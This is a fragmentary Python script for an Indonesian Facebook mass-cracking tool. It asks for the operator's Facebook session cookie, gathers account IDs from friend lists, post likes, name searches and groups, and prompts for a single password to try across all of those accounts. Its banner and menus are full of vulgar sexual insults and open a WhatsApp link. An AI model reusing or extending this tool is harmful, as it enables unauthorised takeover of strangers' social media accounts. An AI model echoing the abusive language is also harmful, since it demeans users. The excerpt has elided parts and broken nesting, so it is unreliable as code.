...
def baner():
    time.sleep(1)
    kata("""\n\tHello Gaes Watsap Bro Gw Sangad Berterimakasih Pada Lu Semua Yank Ngentod....""")
    os.system("xdg-open https://api.whatsapp.com/send?phone=6281234567890&text=HalloOm")
    time.sleep(3)
    clear()
    print ("\33[33;1m ☆┌─┐  ─┐☆")
    print ("\33[33;1m　│▒│ /▒/       \033[1;94m__________________________________")
    print ("\33[33;1m　│▒│/▒/        \33[31;1m[߷]\33[32;1mAuthor   : SugioNo          \33[31;1m[߷]")
    print ("\33[33;1m　│▒ /▒/─┬─┐◯   \33[31;1m[߷]\33[32;1mWhatsApp : 0852-1302-1932   \33[31;1m[߷]")
    print ("\33[33;1m　│▒│▒|▒│▒│     \33[31;1m[߷]\33[32;1mFacebook : M RIVALDI X ANJAY\33[31;1m[߷]")
    print ("\33[33;1m┌┴─┴─┐ -┘─┘     \033[1;94m──────────────────────────────────")
    print ("\33[33;1m│▒┌──┘▒▒▒│◯")
    print ("\33[33;1m└┐▒▒▒▒▒▒┌┘     👙=  Recode By : P a L L =👙")
    print ("\33[33;1m◯└┐▒▒▒▒┌            Kakek     : SugioNo")
    print ("\33[33;1m                    Nenek     : Mia Khalifa")
def mbf(): 
    time.sleep(1)
    print("\33[31;1m[߷]\033[1;94m__________________________________________\33[31;1m[߷]")
    time.sleep(1)
    print("\33[37;1m[\33[33;1mkontol\33[37;1m]\33[32;1mLogin Facebook Via Cookie Lu Tolol   \33[31;1m[߷]")
    time.sleep(2)
    print("\33[37;1m[\33[33;1mmemek\33[37;1m ]\33[32;1mKeluar Dari Tools Ini Bangsad        \33[31;1m[߷]")
    time.sleep(2)
    print("\33[31;1m[߷]\033[1;94m__________________________________________\33[31;1m[߷]")
    time.sleep(2)
    f=input("\n\33[32;1mSilahkan Ketik \33[33;1mkontol: \33[0;36m")
    if f == "kontol":
         ...
         def masuk():
             try:
                    ...
                    cek = input("\033[90m💔 \033[00mIsi Coookies Lu Tolol: \033[1;92m")
             cek = {"cookie":cek}
         ...
         if __name__ == '__main__':
               try:
                   ...
                   clear()
                   baner()
                   kata('\033[94m__________________________________________\033[0m\n')
                   print('\033[1;97m[\033[1;93m1\033[1;97m] \33[32;1mCrack Dari Daftar Teman Om         \33[31;1m[߷]')
                   print('\033[1;97m[\033[1;93m2\033[1;97m] \33[32;1mCrack Dari Like Postingan Om       \33[31;1m[߷]')
                   print('\033[1;97m[\033[1;93m3\033[1;97m] \33[32;1mCrack Dari Pencarian Nama Om       \33[31;1m[߷]')
                   print('\033[1;97m[\033[1;93m4\033[1;97m] \33[32;1mCrack Dari Grup Om                 \33[31;1m[߷]')
                   print('\033[1;97m[\033[1;93m5\033[1;97m] \33[32;1mCrack Dari Teman Om                \33[31;1m[߷]')
                   print('\033[1;97m[\033[1;93m6\033[1;97m] \33[32;1mLihat Hasil Crack Om               \33[31;1m[߷]')
                   kata('\033[94m__________________________________________\033[0m\n')
                   print()
                   tanya = input('\33[33;1mHajar Om: \033[1;93m ')
                   if tanya =="":
                         ...
                         username = input("\33[33;1mHajar Om: \033[00mURL Post : \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Dont be empty")
                         ...
                         knf = input("\33[33;1mHajar Om: \033[00mquery : \033[1;92m")
                         ...
                         grab = input("\033[90mHajar Om: \033[00mID group : \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
                   elif tanya == '5':
                         knf = input("\33[33;1mHajar Om: \033[00mUsername/Id : \033[1;92m")
                         if knf.isdigit():
                   ...
                   print()
                   expass = input("\33[33;1mHajar Om: \033[00mIsi Password Om: \033[1;92m")
